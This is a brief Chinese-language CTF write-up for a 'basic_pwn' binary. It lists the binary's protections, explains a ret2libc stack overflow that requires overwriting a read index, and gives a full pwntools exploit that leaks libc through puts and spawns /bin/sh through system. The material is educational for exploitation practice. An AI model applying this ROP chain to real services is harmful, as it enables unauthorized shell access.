# basic_pwn

## 文件属性

|属性  |值    |
|------|------|
|Arch  |amd64 |
|RELRO |Full  |
|Canary|off   |
|NX    |on    |
|PIE   |off   |
|strip |no    |
|libc  |2.35-0ubuntu3.15|

## 解题思路

非常基础的 ret2libc 考点，板子一套就行了。唯一要注意的地方是栈溢出开始位置是
`rbp - 0x40`，但是记录读取位置的索引在 `rbp - 0x4`，需要注意修改索引的值，
才能正确向后栈溢出。

## EXPLOIT

```python
from pwn import *
def GOLD_TEXT(x): return f'\x1b[33m{x}\x1b[0m'
context.arch = 'amd64'
EXE = './basic_pwn'

def payload(lo: int):
    global t
    if lo:
        t = process(EXE)
        if lo & 2:
            gdb.attach(t)
    else:
        t = remote('', 9999)
    elf = ELF(EXE)
    rop = ROP(elf)
    libc = elf.libc

    t.sendlineafter(b'Welcome', p8(0x47).rjust(0x3d) + flat(
        rop.rdi.address, elf.got['puts'],
        elf.plt['puts'], elf.symbols['main'],
    ))

    t.recvuntil(b'received\n')
    puts = u64(t.recvline()[:6] + b'\0\0')
    libc_base = puts - libc.symbols['puts']
    success(GOLD_TEXT(f'Leak libc_base: {libc_base:#x}'))
    libc.address = libc_base

    t.sendlineafter(b'Welcome', p8(0x47).rjust(0x3d) + flat(
        rop.rdi.address, next(libc.search(b'/bin/sh')),
        rop.ret.address, libc.symbols['system'],
        libc.symbols['_exit'],
    ))

    t.clean()
    t.interactive()
    t.close()
```
